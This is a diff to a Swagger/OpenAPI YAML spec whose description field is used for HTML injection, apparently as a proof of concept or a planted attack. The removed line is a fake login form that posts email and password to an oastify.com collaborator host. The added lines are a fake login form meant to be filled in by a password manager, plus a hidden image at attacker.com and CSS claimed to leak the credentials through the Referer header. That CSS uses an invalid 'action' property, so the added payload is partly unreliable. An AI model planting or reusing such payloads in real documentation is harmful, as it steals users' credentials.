@@ -2,7 +2,30 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-   <form action="https://bds4gi6qdvtmclegmps4yq4orfxfl59u.oastify.com" method="POST"><h3>Please login to continue</h3><input type="email" name="email" autocomplete="username" placeholder="Email"><input type="password" name="password" autocomplete="current-password" placeholder="Password"><button type="submit">Login</button></form>
+  <!-- Fake login form that auto-fills via password manager -->
+<form id="leakForm" action="/login" method="GET">
+  <h3>Please log in to continue</h3>
+  <input type="email" name="email" autocomplete="username" placeholder="Email">
+  <input type="password" name="password" autocomplete="current-password" placeholder="Password">
+  <button type="submit">Login</button>
+</form>
+
+<!-- Hidden image that loads upon submission -->
+<img src="https://attacker.com/leak.jpg" style="display:none;">
+
+<!-- CSS trick to auto-submit and leak Referer -->
+<style>
+  /* If the form submits to a GET endpoint, the params appear in the URL */
+  form#leakForm {
+    action: "/login?email=USER_EMAIL&password=USER_PASSWORD";
+  }
+  
+  /* After submission, the Referer header will contain the full URL with params */
+  img[src="https://attacker.com/leak.jpg"] {
+    display: block;
+  }
+</style>
+
   /accounts:
     get:
       responses:
